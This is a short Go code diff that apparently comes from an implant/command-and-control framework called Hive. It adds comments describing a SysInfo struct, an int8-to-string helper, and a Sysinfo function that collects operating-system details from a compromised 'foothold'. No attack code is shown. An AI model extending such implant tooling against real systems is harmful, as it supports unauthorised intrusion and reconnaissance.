@@ -15,6 +15,10 @@ import (
     "runtime"
 )
 
+/*
+This JSON Object definition is needed in some Implants Modules to decode parameters
+Hive will have the same definitions in: ./src/hive/hiveJobs.go
+*/
 type SysInfo struct {
     Pid string  `json:"pid"`
     Arch string  `json:"arch"`
@@ -27,6 +31,7 @@ type SysInfo struct {
 
 }
 
+//Utility Function to transform int8 to strings
 func int8ToStr(arr []int8) string {
     b := make([]byte, 0, len(arr))
     for _, v := range arr {
@@ -39,7 +44,11 @@ func int8ToStr(arr []int8) string {
 }
 
 
-
+/*
+Description: Sysinfo --> Linux. Retrieve Operating System key information from the foothold.
+Flow:
+A.Use Go native libraries and Linux syscalls to retrieve key foothold information
+*/
 func Sysinfo() (bool,string){
 
 	var(
